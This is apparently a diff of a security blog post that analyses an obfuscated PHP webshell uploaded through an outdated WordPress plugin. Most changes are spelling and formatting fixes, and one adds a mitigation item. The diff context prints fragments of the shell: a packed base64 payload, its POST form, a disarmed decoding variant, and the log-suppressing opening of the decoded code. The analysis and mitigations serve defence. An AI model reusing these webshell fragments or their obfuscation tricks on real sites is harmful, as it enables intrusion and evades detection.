@@ -19,13 +19,13 @@ So if you take one thing away from this post please make sure it's:
 1. *KEEP YOUR WORDPRESS INSTALL UP TO DATE*
 2. *KEEP ALL YOUR WORDPRESS PLUGINS UP TO DATE*
 
-Simple enough right? of course this isn't a "cure all" and there's other vulnerabilites an mitigations to consider; but not for this post.
+Simple enough right? You would have thought so, but of course this isn't a "cure all" and there's other vulnerabilites and mitigations to consider; but not for this post.
 
 # RFU
 
-Remote File Upload.
+*Remote File Upload*.
 
-So the site in question had a plugin which was out of date. This plugin had a RFU vulnerability which allowed attackers to upload arbitary code files then head to
+So the site in question had a plugin which was out of date. This plugin had a RFU vulnerability which allowed attackers to upload arbitrary code files then head to
 
 https://thesite.com/wp-content/pluginname/uploadedfile.php 
 
@@ -33,15 +33,17 @@ To execute the attack.
 
 Standard, boring crap right ? 
 
-Well this post isn't to focus on how it happened, nor why it happed. Simply put the php file itself I found very interesting.
+Well this post isn't to focus on how it happened, nor why it happed. 
+
+Simply put the php file itself I found *very interesting*.
 
 # PHP Code obfustication
 
-Sure, code obfustication is not something new, heck tools like msfvenom allow you to choose from a variety of obfustication methods the premis for which is to avoid signatures for "known bad" files, and thus avoid common signatures (which is why you should not rely solely on signature bases analysis).
+Sure, code obfustication is nothing new. Heck tools like msfvenom allow you to choose from a variety of obfustication methods the premis for which is to avoid signatures for "known bad" files, and thus avoid common signatures (which is why you should not rely solely on signature bases analysis).
 
-The thing is the overwhelming majority of webshell obfustication is done through "packing", you'll see it use base64, gzinflate, eval and it's a pretty common standard.
+The thing is the overwhelming majority of webshell obfustication is done through "packing", you'll see it use base64, gzinflate, eval and that's a pretty common standard.
 
-Not this little bastard, and that's why this got my attention
+Not this little *bastard*, and that's why this got my attention
 
 Head of the file:
 
@@ -58,7 +60,7 @@ Z5Cu7f8PYmaBthyP3iqZk/ur0i1+64uyYe9XaiXkORQ/F90DEaY0m3MAxIptHs8lQMclnoIX27gTJnAv
 NpcyJgsM5Z8w/6dApQTxWU4/iA+QIKZATqlKYDpuScahCgOIlenxBhEsjB7s2mpG82vcs+/FoxuobVLZ
 ```
 
-Well, that's ... interesting ...
+Well, that's ... *Interesting* ...
 
 Tail of the file
 
@@ -142,7 +144,7 @@ if( $wp_wp !== NULL ) {
 <form action="" method="post"><input type="text" name="wp_wp" value=""/><input type="submit" value="&gt;"/></form>
 ```
 
-I suppose we _could_ go the python route again, however as we've discerened the function (loop unpack payload -> create_function -> execute function), we can "disarm" it to instead echo out the unpacked code for further analysis.
+I suppose we _could_ go the python route again, however as we've discerned the function (loop unpack payload -> create_function -> execute function), we can "disarm" it to instead echo out the unpacked code for further analysis.
 
 
 So the file with the required modifications ...
@@ -164,7 +166,7 @@ So the file with the required modifications ...
 > }}?><form action="" method="post"><input type="text" name="wp_wp" value=""/><input type="submit" value="&gt;"/></form>
 ```
 
-The resuling payload starts off as
+The resulting payload starts off as
 
 ```php
 @ini_set('log_errors_max_len',0);@ini_restore('log_errors');@ini_restore('error_log');@ini_restore('error_reporting');@ini_set('log_errors',0);@ini_set('error_log',NULL);@ini_set('error_reporting',NULL);@error_
@@ -187,12 +189,12 @@ $wp__wp='base'.(32*2).'_de'.'code';
 ```
 
 Was instead moved to reside inside the packed payload, how would you possibly be able to begin to write a signature for such a file?
-Fuzzy logic sure, look for long strings of seemingly random content, still I can see that's going to run false positives in the masses given the various obfusticating options out there for php such as those that require licensening ...
+
+Fuzzy logic sure, look for long strings of seemingly random content, still I can see that's going to run false positives in the masses given the various obfusticating options out there for php such as those that require licensing ...
 
 ## Mitigation ?
 
-1. SELinux set ON, will limit what the web server process can access (it's not going to stop it getting access to your database servers, and if you have `httpd_can_network_connect` set to true, it's not going to stop it creating a reverse shell either)
+1. SELinux set ON, will limit what the web server process can access (it's not going to stop it getting access to your database servers, and if you have `httpd_can_network_connect` set to true, it's not going to stop it creating a reverse shell either, check out `httpd_can_connect_db` to maintain web app functionality but make it harder for attackers)
 2. KEEP UP TO DATE WITH PATCHES, Web application, system packages ... patch all the things!
 3. WAF and/or IPS (inspect POST & GET, for SQL, known shell commands and block (will not prevent file download / upload))
-
-
+4. PHP disable_functions ([I covered this back in 2008](https://www.flickr.com/photos/31732936@N06/3079949402/), [cyberciti has a good write up](http://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/))
